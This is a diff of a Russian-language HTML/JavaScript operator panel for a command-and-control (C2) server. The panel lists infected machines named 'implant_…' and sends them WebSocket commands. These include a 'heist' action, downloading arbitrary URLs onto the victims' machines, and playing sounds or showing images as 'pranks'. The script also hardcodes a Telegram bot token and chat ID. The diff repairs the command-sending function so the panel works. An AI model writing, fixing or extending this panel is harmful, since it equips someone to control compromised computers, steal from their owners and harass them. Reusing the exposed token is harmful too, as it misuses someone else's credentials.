@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Версия 5.0 - "Коммандный мостик") -->
+<!-- Файл: index.html (Версия 5.1 - Стабилизация) -->
 <html lang="ru">
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>C2 Коммандный Мостик v5.0</title>
+ <title>C2 Коммандный Мостик v5.1</title>
+ <!-- ... (Все твои <style> остаются здесь без изменений) ... -->
  <style>
- /* --- ОБЩИЕ СТИЛИ И ЦВЕТА (без изменений) --- */
  :root { --bg-color: #1a1a1c; --primary-color: #2e2e33; --secondary-color: #45454d; --text-color: #e1e1e1; --accent-color: #00aaff; --recon-color: #007bff; --heist-color: #dc3545; --system-color: #6f42c1; --prank-color: #28a745; --download-color: #ffc107; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 0; height: 100vh; overflow: hidden; }
  h1, h2, h3 { margin: 0; }
@@ -19,16 +19,12 @@
  input[type="text"] { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid var(--secondary-color); background-color: var(--bg-color); color: var(--text-color); box-sizing: border-box; }
  input[type="range"] { width: 100%; cursor: pointer; }
  footer { text-align: center; padding: 15px; font-weight: 500; color: var(--accent-color); border-top: 1px solid var(--secondary-color); position: fixed; bottom: 0; width: 100%; background-color: var(--bg-color); }
-
- /* --- НОВАЯ ДВУХПАНЕЛЬНАЯ СТРУКТУРА --- */
  .container { display: flex; flex-direction: column; height: 100%; }
- .app-layout { display: flex; flex-grow: 1; overflow: hidden; padding: 25px; gap: 25px; margin-bottom: 50px; /* Отступ для футера */ }
+ .app-layout { display: flex; flex-grow: 1; overflow: hidden; padding: 25px; gap: 25px; margin-bottom: 50px; }
  .sidebar { flex: 0 0 300px; background-color: var(--primary-color); border-radius: 12px; border: 1px solid var(--secondary-color); display: flex; flex-direction: column; overflow: hidden; }
  .sidebar h2 { padding: 25px; margin: 0; }
  #bot-list { flex-grow: 1; overflow-y: auto; padding: 0 25px 25px; display: flex; flex-direction: column; gap: 10px; }
  .main-content { flex-grow: 1; overflow-y: auto; }
-
- /* --- СТИЛИ КНОПОК И ЭЛЕМЕНТОВ (без изменений) --- */
  .btn-bot { background-color: #495057; }
  .btn-bot.selected { border: 3px solid var(--accent-color); background-color: #0056b3; }
  .btn-recon { background-color: var(--recon-color); }
@@ -43,18 +39,12 @@
  .thumbnail-item img { width: 100px; height: 100px; object-fit: cover; border: 2px solid var(--bg-color); border-radius: 8px; transition: transform 0.2s; }
  .thumbnail-item:hover img { transform: scale(1.05); }
  .thumbnail-item p { margin: 8px 0 0 0; font-size: 0.8em; word-wrap: break-word; color: var(--text-color); height: 2.5em; overflow: hidden; }
-
- /* --- АДАПТИВНОСТЬ ДЛЯ МОБИЛЬНЫХ --- */
- @media (max-width: 900px) {
-  .app-layout { flex-direction: column; }
-  .sidebar { flex: 0 0 auto; max-height: 40vh; }
-  body { padding-bottom: 50px; }
- }
+ @media (max-width: 900px) { .app-layout { flex-direction: column; } .sidebar { flex: 0 0 auto; max-height: 40vh; } body { padding-bottom: 50px; } }
  </style>
 </head>
 <body>
 <div class="container">
- <header><h1>Коммандный Мостик v5.0</h1></header>
+ <header><h1>Коммандный Мостик v5.1</h1></header&gt;
 
  <div class="app-layout">
  <!-- ЛЕВАЯ ПАНЕЛЬ: СПИСОК БОТОВ -->
@@ -74,13 +64,11 @@
    <button class="btn-heist" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
    </div>
   </section>
-
   <section id="download-section">
    <h2>Загрузка новых файлов</h2>
    <input type="text" id="url-input" placeholder="Вставьте URL файла (mp3, wav, jpg, png)...">
    <button class="btn-download" onclick="downloadFile()">Загрузить</button>
   </section>
-
   <section id="prank-controls-section">
    <h2>Пранки и Медиа</h2>
    <div class="grid-controls">
@@ -109,7 +97,7 @@
 
 <script>
  // ==============================================================================
- // JAVASCRIPT-МОЗГ ПАНЕЛИ (Версия осталась прежней, она стабильна)
+ // JAVASCRIPT-МОЗГ ПАНЕЛИ (Возвращена стабильная версия v4.0)
  // ==============================================================================
  const TG_BOT_TOKEN = "7650238850:AAFFcTP5uesNyAreZbW5_gL36brFObm2e34";
  const TG_CHAT_ID = "1640138978";
@@ -160,8 +148,9 @@
  if (botId) {
   ui.controlsWrapper.style.display = 'block';
   ui.selectedBotName.textContent = botId.replace('implant_', '');
-  sendCommand({ type: 'command', payload: { action: 'get_details' } });
-  sendCommand({ type: 'command', payload: { action: 'get_volume_state' } });
+  // Используем старую, рабочую логику отправки
+  sendCommand({ action: 'get_details' });
+  sendCommand({ action: 'get_volume_state' });
  } else {
   ui.controlsWrapper.style.display = 'none';
  }
@@ -169,25 +158,32 @@
 
  function updateVolumeUI(state) {
  ui.volumeSlider.value = state.level;
- ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
+ ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" :"Вкл/Выкл Звук";
  ui.muteButton.style.backgroundColor = state.is_muted ? "var(--heist-color)" : "var(--system-color)";
  }
 
  function renderBotFiles(files) {
- const audioContainer = ui.audioFilesList; audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>'; if(files.audio) files.audio.forEach(file => { const btn = document.createElement('button'); btn.textContent = file; btn.className = 'btn-prank'; btn.onclick = () => sendCommand({payload: { action: 'play', filename: file }}); audioContainer.appendChild(btn); }); const imageContainer = ui.imageFilesList; imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>'; if(files.image) files.image.forEach(imgData => { const item = document.createElement('div'); item.className = 'thumbnail-item'; item.onclick = () => sendCommand({payload: {action: 'show', filename: imgData.filename }}); const imgElement = document.createElement('img'); imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : 'https://via.placeholder.com/100x100.png?text=No+Preview'; imgElement.alt = imgData.filename; const nameElement = document.createElement('p'); nameElement.textContent = imgData.filename; item.appendChild(imgElement); item.appendChild(nameElement); imageContainer.appendChild(item); });
+ const audioContainer = ui.audioFilesList; audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>'; if(files.audio) files.audio.forEach(file => { const btn = document.createElement('button'); btn.textContent = file; btn.className = 'btn-prank'; btn.onclick = () => sendCommand({ action: 'play', filename: file }); audioContainer.appendChild(btn); }); const imageContainer = ui.imageFilesList; imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>'; if(files.image) files.image.forEach(imgData => { const item = document.createElement('div'); item.className = 'thumbnail-item'; item.onclick = () => sendCommand({action: 'show', filename: imgData.filename }); const imgElement = document.createElement('img'); imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : 'https://via.placeholder.com/100x100.png?text=No+Preview'; imgElement.alt = imgData.filename; const nameElement = document.createElement('p'); nameElement.textContent = imgData.filename; item.appendChild(imgElement); item.appendChild(nameElement); imageContainer.appendChild(item); });
  }
 
- function sendCommand({payload}) {
+ // <<< ИСПРАВЛЕНИЕ: Возвращена старая, рабочая версия sendCommand >>>
+ function sendCommand(payload) {
  if (!selectedBotId) return;
+ // Эта логика правильно определяет тип команды для сервера
+ const commandType = (payload.action === 'get_details' || payload.action === 'get_volume_state') ? payload.action : 'command';
  if (payload.action === 'heist' && !confirm(`ТЫ УВЕРЕН, ЧТО ХОЧЕШЬ ЗАПУСТИТЬ HEIST НА ${selectedBotId.replace('implant_', '')}?`)) return;
- socket.send(JSON.stringify({ type: 'command', target_id: selectedBotId, payload }));
- ui.statusFooter.textContent = `Команда '${payload.action}' отправлена...`;
+ socket.send(JSON.stringify({ type: commandType, target_id: selectedBotId, payload }));
+ if (commandType === 'command') {
+  ui.statusFooter.textContent = `Команда '${payload.action}' отправлена...`;
+ }
  }
 
  const debounce = (func, delay) => { let timeout; return (...args) => { clearTimeout(timeout); timeout = setTimeout(() => func(...args), delay); }; };
- ui.volumeSlider.addEventListener('input', (event) => { setVolume(event.target.value); });
- const setVolume = debounce(value => sendCommand({payload: { action: 'volume', level: value }}), 250);
- function downloadFile() { const url = ui.urlInput.value.trim(); if (url) { sendCommand({payload: { action: 'download', url }}); ui.urlInput.value = ''; } }
+ ui.volumeSlider.addEventListener('input', (event) => {
+ setVolume(event.target.value);
+ });
+ const setVolume = debounce(value => sendCommand({ action: 'volume', level: value }), 250);
+ function downloadFile() { const url = ui.urlInput.value.trim(); if (url) { sendCommand({ action: 'download', url }); ui.urlInput.value = ''; } }
 
  connect();
 </script>
